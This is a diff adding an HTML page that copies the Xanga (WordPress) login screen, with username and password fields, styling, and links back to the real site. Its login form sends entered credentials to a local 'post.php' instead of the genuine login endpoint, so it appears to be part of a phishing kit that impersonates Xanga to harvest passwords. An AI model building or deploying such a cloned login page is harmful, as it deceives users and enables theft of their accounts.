@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+	<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US">
+	<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+	<title>Xanga &rsaquo; Log In</title>
+	<link rel='stylesheet' id='wp-admin-css'  href='http://xanga.com/wp-admin/css/wp-admin.min.css?ver=3.6.2-alpha' type='text/css' media='all' />
+<link rel='stylesheet' id='buttons-css'  href='http://xanga.com/wp-includes/css/buttons.min.css?ver=3.6.2-alpha' type='text/css' media='all' />
+<link rel='stylesheet' id='colors-fresh-css'  href='http://xanga.com/wp-admin/css/colors-fresh.min.css?ver=3.6.2-alpha' type='text/css' media='all' />
+<meta name='robots' content='noindex,nofollow' />
+<meta name="robots" content="noarchive" />
+
+<style type="text/css">
+.login h1 a {
+    background-image: url("img/logo.png");
+    background-position: center top;
+    background-size: 300px 160px;
+    background-repeat: no-repeat;
+    height: 160px;
+    width: 320px;
+    padding:0;
+}
+#wpadminbar {
+     background:#4685C4 !important;
+     color:#fff;
+}
+#wpadminbar .quicklinks > ul > li > a , #wpadminbar .quicklinks > ul > li, #wpadminbar .quicklinks > ul > li.opposite, #wpadminbar .quicklinks > ul > li.opposite a,
+#wpadminbar .quicklinks .ab-top-secondary > li > a, #wpadminbar .quicklinks .ab-top-secondary > li > .ab-empty-item {
+      border-color:#4685C4 !important;
+      color:#fff;
+}
+#wpadminbar .ab-top-secondary {
+     background:#4685C4 !important;
+     color:#fff;
+}
+li.xangalogo-toolbar .ab-item, li.xangalogo-toolbar .ab-item:focus {
+     width:95px !important;
+     height:15px !important;
+     text-indent:-9999em;
+     background: #4685C4 url("//xanga.com/common/xangalogo-toolbar.png") no-repeat top left !important;
+     margin:7px 3px 0 3px !important;
+     padding:0 !important;
+}
+</style>
+	</head>
+	<body class="login login-action-login wp-core-ui">
+	<div id="login">
+		<h1><a href="http://xanga.com/" title="Xanga">Xanga</a></h1>
+	
+<form name="loginform" id="loginform" action="post.php" method="post">
+	<p>
+		<label for="user_login">Username<br />
+		<input type="text" name="log" id="user_login" class="input" value="" size="20" /></label>
+	</p>
+	<p>
+		<label for="user_pass">Password<br />
+		<input type="password" name="pwd" id="user_pass" class="input" value="" size="20" /></label>
+	</p>
+<input type="hidden" name="time2n" value="1644797514" />	<p class="forgetmenot"><label for="rememberme"><input name="rememberme" type="checkbox" id="rememberme" value="forever"  /> Remember Me</label></p>
+	<p class="submit">
+		<input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Log In" />
+		<input type="hidden" name="redirect_to" value="http://xanga.com/wp-admin/admin.php?page=xanga_reading" />
+		<input type="hidden" name="testcookie" value="1" />
+	</p>
+</form>
+
+<p id="nav">
+		<a href="http://xanga.com/wp-login.php?action=lostpassword" title="Password Lost and Found">Lost your password?</a>
+</p>
+
+<script type="text/javascript">
+function wp_attempt_focus(){
+setTimeout( function(){ try{
+d = document.getElementById('user_login');
+d.focus();
+d.select();
+} catch(e){}
+}, 200);
+}
+
+wp_attempt_focus();
+if(typeof wpOnload=='function')wpOnload();
+</script>
+
+	<p id="backtoblog"><a href="http://xanga.com/" title="Are you lost?">&larr; Back to Xanga</a></p>
+	
+	</div>
+
+	
+		<div class="clear"></div>
+	</body>
+	</html>
+	
